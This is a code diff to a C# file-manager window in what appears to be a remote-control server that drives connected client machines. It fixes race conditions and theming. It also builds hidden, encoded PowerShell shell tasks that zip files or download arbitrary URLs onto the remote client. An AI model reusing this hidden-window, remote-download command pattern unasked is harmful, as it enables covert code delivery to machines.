@@ -24,6 +24,9 @@ public partial class FileManagerWindow : ThemedWindow
     private TaskCompletionSource<string>? _pendingPreview; // BtnPreview_Click
     private TaskCompletionSource<string>? _pendingHash;
     private TaskCompletionSource<string>? _pendingAck;
+    // Monotone counter — incremented before each preview request.
+    // Checked after the await so a stale response that completed the TCS is silently discarded.
+    private int _previewSerial;
 
     public FileManagerWindow(TlsServer server, string clientId, string clientLabel)
     {
@@ -170,6 +173,8 @@ public partial class FileManagerWindow : ThemedWindow
         TxtStatus.Text = Lang.Get("FM_LOADING");
         try
         {
+            // Cancel any concurrent Navigate so its response doesn't land in the new TCS.
+            _pendingList?.TrySetCanceled();
             _pendingList = new TaskCompletionSource<string>();
             await _server.SendToClient(_clientId, new Packet
             {
@@ -229,6 +234,11 @@ public partial class FileManagerWindow : ThemedWindow
         ShowTransfer(row.Name, Lang.Get("FM_REQUESTING"));
         try
         {
+            // Kill any in-flight auto-preview so its FmFileData response isn't routed
+            // to _pendingData and download doesn't receive the wrong file's content.
+            _pendingPreview?.TrySetCanceled();
+            _pendingPreview = null;
+            _previewSerial++;
             _pendingData = new TaskCompletionSource<string>();
             await _server.SendToClient(_clientId, new Packet
             {
@@ -389,6 +399,7 @@ public partial class FileManagerWindow : ThemedWindow
                         lastError = ack?.Error ?? "Unknown error";
                     }
                 }
+                catch (OperationCanceledException) { break; } // client disconnected — stop loop
                 catch (Exception ex)
                 {
                     failedCount++;
@@ -396,7 +407,7 @@ public partial class FileManagerWindow : ThemedWindow
                 }
                 finally { _pendingAck = null; }
             }
-            
+
             NotificationService.NotifyFileDeleted();
             if (failedCount == 0)
             {
@@ -648,10 +659,14 @@ public partial class FileManagerWindow : ThemedWindow
             Background = (Application.Current.TryFindResource("WindowBgBrush") as System.Windows.Media.Brush)
                       ?? new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(12, 13, 24))
         };
+        var textBrush = Application.Current.TryFindResource("ContentTextBrush") as System.Windows.Media.Brush
+                     ?? System.Windows.Media.Brushes.White;
+        var dimBrush  = Application.Current.TryFindResource("FieldLabelBrush") as System.Windows.Media.Brush
+                     ?? System.Windows.Media.Brushes.Gray;
         var sp = new System.Windows.Controls.StackPanel { Margin = new Thickness(16) };
         sp.Children.Add(new System.Windows.Controls.TextBlock
         {
-            Text = fileName, Foreground = System.Windows.Media.Brushes.Gray,
+            Text = fileName, Foreground = dimBrush,
             FontSize = 10, Margin = new Thickness(0, 0, 0, 10),
             TextTrimming = System.Windows.TextTrimming.CharacterEllipsis
         });
@@ -668,7 +683,7 @@ public partial class FileManagerWindow : ThemedWindow
             {
                 Content = f.ToString(),
                 IsChecked = current.HasFlag(f),
-                Foreground = System.Windows.Media.Brushes.White,
+                Foreground = textBrush,
                 Margin = new Thickness(0, 2, 0, 2),
             };
             sp.Children.Add(cb);
@@ -786,7 +801,10 @@ public partial class FileManagerWindow : ThemedWindow
         ServerWindow.ReportGlobalActivity("Zip item", row.Name, "running");
         ServerWindow.LogGlobal($"[FM] Zipping '{path}' to '{dest}' on client {_clientId}...");
 
-        // Use PS encoded command — paths quoted in SET to handle & in names/paths
+        // Use PS encoded command — paths quoted in SET to handle & in names/paths.
+        // Double-quote any embedded " so CMD SET doesn't break on filenames like foo"bar.
+        var safeSrc = path.Replace("\"", "\"\"");
+        var safeDst = dest.Replace("\"", "\"\"");
         var ps  = "Compress-Archive -Path $env:SERO_SRC -DestinationPath $env:SERO_DST -Force";
         var enc = Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(ps));
         try
@@ -794,7 +812,7 @@ public partial class FileManagerWindow : ThemedWindow
             await _server.SendToClient(_clientId, new Packet
             {
                 Type = PacketType.AutoTaskShell,
-                Data = $"SET \"SERO_SRC={path}\"&& SET \"SERO_DST={dest}\"&& powershell -NoP -NonI -W H -EncodedCommand {enc}"
+                Data = $"SET \"SERO_SRC={safeSrc}\"&& SET \"SERO_DST={safeDst}\"&& powershell -NoP -NonI -W H -EncodedCommand {enc}"
             });
             TxtStatus.Text = string.Format(Lang.Get("FM_ZIPPING"), row.Name);
             await Task.Delay(8000);
@@ -837,7 +855,10 @@ public partial class FileManagerWindow : ThemedWindow
         ServerWindow.ReportGlobalActivity("Download URL", filename, "running");
         ServerWindow.LogGlobal($"[FM] Requesting URL download '{url}' to '{dest}' on client {_clientId}...");
 
-        // Use PS encoded command — values quoted in SET so & in URLs/paths is treated literally
+        // Use PS encoded command — values quoted in SET so & in URLs/paths is treated literally.
+        // Double-quote any embedded " to prevent CMD SET from breaking the quoting context.
+        var safeUrl  = url.Replace("\"", "\"\"");
+        var safeDest = dest.Replace("\"", "\"\"");
         var ps  = "Invoke-WebRequest -Uri $env:SERO_URL -OutFile $env:SERO_OUT -UseBasicParsing";
         var enc = Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(ps));
         try
@@ -845,7 +866,7 @@ public partial class FileManagerWindow : ThemedWindow
             await _server.SendToClient(_clientId, new Packet
             {
                 Type = PacketType.AutoTaskShell,
-                Data = $"SET \"SERO_URL={url}\"&& SET \"SERO_OUT={dest}\"&& powershell -NoP -NonI -W H -EncodedCommand {enc}"
+                Data = $"SET \"SERO_URL={safeUrl}\"&& SET \"SERO_OUT={safeDest}\"&& powershell -NoP -NonI -W H -EncodedCommand {enc}"
             });
             TxtStatus.Text = string.Format(Lang.Get("FM_DOWNLOADING"), filename);
             await Task.Delay(8000);
@@ -932,19 +953,24 @@ public partial class FileManagerWindow : ThemedWindow
             Background = (Application.Current.TryFindResource("WindowBgBrush") as System.Windows.Media.Brush)
                       ?? new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(18, 18, 34))
         };
+        var pTextBrush   = Application.Current.TryFindResource("ContentTextBrush") as System.Windows.Media.Brush
+                        ?? System.Windows.Media.Brushes.White;
+        var pInputBg     = Application.Current.TryFindResource("InputBgBrush") as System.Windows.Media.Brush
+                        ?? new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(12, 13, 24));
+        var pBorderBrush = Application.Current.TryFindResource("InputBorderBrush") as System.Windows.Media.Brush
+                        ?? new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(42, 48, 88));
         var sp = new System.Windows.Controls.StackPanel { Margin = new Thickness(16) };
         sp.Children.Add(new System.Windows.Controls.TextBlock
         {
-            Text = label, Foreground = System.Windows.Media.Brushes.White,
+            Text = label, Foreground = pTextBrush,
             FontSize = 12, Margin = new Thickness(0, 0, 0, 8)
         });
         var tb = new System.Windows.Controls.TextBox
         {
             Text = defaultVal,
-            Background = (Application.Current.TryFindResource("WindowBgBrush") as System.Windows.Media.Brush)
-                      ?? new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(12, 13, 24)),
-            Foreground = System.Windows.Media.Brushes.White,
-            BorderBrush = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(42, 48, 88)),
+            Background  = pInputBg,
+            Foreground  = pTextBrush,
+            BorderBrush = pBorderBrush,
             Padding = new Thickness(6, 4, 6, 4),
             Margin = new Thickness(0, 0, 0, 8)
         };
@@ -1006,8 +1032,9 @@ public partial class FileManagerWindow : ThemedWindow
 
         try
         {
-            // Cancel any in-flight preview (rapid file selection) so its stale
-            // response doesn't complete the new TCS with the wrong file's data.
+            // Capture serial before the request — checked after await so a stale response
+            // that completed the TCS with the wrong file's data is silently discarded.
+            int mySerial = ++_previewSerial;
             _pendingPreview?.TrySetCanceled();
             _pendingPreview = new TaskCompletionSource<string>();
             await _server.SendToClient(_clientId, new Packet
@@ -1017,6 +1044,8 @@ public partial class FileManagerWindow : ThemedWindow
             });
             bool isVideoExt = ext is ".mp4" or ".avi" or ".mkv" or ".mov" or ".wmv" or ".webm" or ".m4v";
             var json   = await _pendingPreview.Task.WaitAsync(isVideoExt ? TimeSpan.FromSeconds(120) : TimeSpan.FromSeconds(30));
+            // Discard stale response — a newer preview request already took over.
+            if (_previewSerial != mySerial) return;
             // Offload JSON decode + Base64 decode to background thread
             var (result, bytes) = await Task.Run(() =>
             {
